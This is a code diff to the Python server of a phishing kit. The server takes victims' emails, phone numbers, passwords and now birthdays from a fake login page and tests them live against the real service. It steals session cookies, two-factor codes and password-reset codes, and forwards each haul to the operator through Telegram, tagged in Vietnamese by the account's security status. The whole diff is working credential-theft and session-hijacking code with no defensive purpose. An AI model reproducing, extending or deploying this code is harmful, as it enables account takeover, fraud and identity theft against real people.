@@ -91,8 +91,9 @@ def handle_login(data):
     else:
         list_victim[ip] = AutoChrome()
     list_victim[ip].email = data["email"]
-    list_victim[ip].phonenumber = data["phone"]
+    list_victim[ip].phone_number = data["phone"]
     list_victim[ip].password = data["password"]
+    list_victim[ip].birthday = data["date"]
     status = list_victim[ip].authenticate_account(
         data["email"], data["password"])
     if status["message"] == "WRONG_CREDENTIALS":
@@ -102,16 +103,16 @@ def handle_login(data):
             Data().add_data(username=data["email"], password=data["password"],
                             country=country, type='SMK')
             telegram.send_message(
-                'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country)
+                'Sai mật khẩu', data["email"], data["phone"], data["password"], ip=ip, country=country, birthday=data["date"])
     if status["message"] == "LOGGED_IN":
         cookie = list_victim[ip].get_cookie(cookie_type)
         Data().add_data(username=data["email"], password=data["password"], cookie=cookie,
                         country=country, type='NUL')
         telegram.send_message(
-            'KHÔNG BẬT 2FA', data["email"], data["phone"], data["password"], cookie, ip=ip, country=country)
+            'KHÔNG BẬT 2FA', data["email"], data["phone"], data["password"], cookie, ip=ip, country=country, birthday=data["date"])
     if status["message"] == "DEVICE_VERIFICATION":
         telegram.send_message(
-            '681 CHƯA XÁC MINH', data["email"], data["phone"], data["password"], ip=ip, country=country)
+            '681 CHƯA XÁC MINH', data["email"], data["phone"], data["password"], ip=ip, country=country, birthday=data["date"])
     socketio.emit("loginResponse", status)
 
 
@@ -132,7 +133,7 @@ def handle_two_factor(code):
         Data().add_data(list_victim[ip].email, list_victim[ip].password,
                         cookie, country=get_country(ip), type='2FA')
         telegram.send_message(
-            '2FA', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, cookie, ip, country=get_country(ip))
+            '2FA', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, cookie, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
     socketio.emit("two-factorResponse", status)
 
 
@@ -150,7 +151,7 @@ def handle_forget_password(code):
     Data().add_data(list_victim[ip].email, list_victim[ip].password,
                     code, country=get_country(ip), type='FGP')
     telegram.send_code(
-        'RESET MẬT KHẨU', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, code, ip, country=get_country(ip))
+        'RESET MẬT KHẨU', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, code, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
     socketio.emit("forget-passwordResponse",
                   {"status": "success", "message": "LOGGED_IN"})
 
@@ -169,7 +170,7 @@ def handle_forget_password(code):
     Data().add_data(list_victim[ip].email, list_victim[ip].password,
                     code, country=get_country(ip), type='FGP')
     telegram.send_code(
-        'CODE 681', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, code, ip, country=get_country(ip))
+        'CODE 681', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, code, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
     socketio.emit("deviceResponse",
                   {"status": "success", "message": "LOGGED_IN"})
 
@@ -192,7 +193,7 @@ def handle_device_verification():
         Data().add_data(list_victim[ip].email, list_victim[ip].password,
                         cookie, country=get_country(ip), type='681')
         telegram.send_message(
-            '681', list_victim[ip].email, list_victim[ip].phonenumber, list_victim[ip].password, cookie, ip, country=get_country(ip))
+            '681', list_victim[ip].email, list_victim[ip].phone_number, list_victim[ip].password, cookie, ip, country=get_country(ip), birthday=list_victim[ip].birthday)
     socketio.emit("device-verificationResponse", status)
 
 
